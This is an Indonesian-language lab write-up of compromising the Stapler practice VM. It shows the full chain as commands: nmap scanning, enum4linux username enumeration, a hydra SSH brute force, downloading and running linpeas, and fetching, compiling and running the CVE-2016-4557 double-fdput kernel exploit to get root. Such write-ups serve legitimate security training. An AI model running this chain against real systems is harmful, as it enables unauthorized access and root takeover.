# Laporan Serangan Server Stapler

Ini adalah hasil serangan yang telah dilakukan pada server Stapler untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server Stapler: `ping <ip_server>`
- jika tidak bisa di ping maka lanjut ke scan port

## Scan Port Server dengan NMAP
- nmap : `nmap -sC -sV -A <ip_server>`

**Port** yang terbuka dari server adalah :
- ftp-data (20)
- ftp (21)
- ssh (22)
- domain (53)
- http (80)
- samba smbd (139)
- doom (666)
- mysql (3306)

## Access Domain (53)
- gunakan tool enum : `enum4linux <ip_server>`
- scroll kebawah temukan user dengan (local user)
- misal : **S-1-22-1-1000 Unix User\peter (Local User)**
- maka buat file : **username.txt**
- dan tuliskan list username :
```
peter
RNunemaker
ETollefson
...
...
...
www
elly
```

## Access SSH (22)
- terdapat data user, gunakan hydra
```
hydra -L username.txt -P username.txt ssh://<ip_server>
```
- user : `SHayslett`
- pass : `SHayslett`
- login ssh
```
ssh SHayslett@<ip_server>
```





## Privilege Escalation
- pada **SSH user SHayslett**
- temukan vulnerability untuk access root dengan linpeas
```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
- dan tunggu (lumayan lama)
- scroll ke atas temukan **[CVE 2016 4557] double-fdput**

**Note:** untuk menggunakan CVE cari yang dari sumber **exploit-db** atau **offensive-security**
- jalankan exploit
```
wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ehb_mapfd_doubleput_exploit
./compile.sh
./doubleputs
```
- temukan flag
```
cat /root/flag.txt
```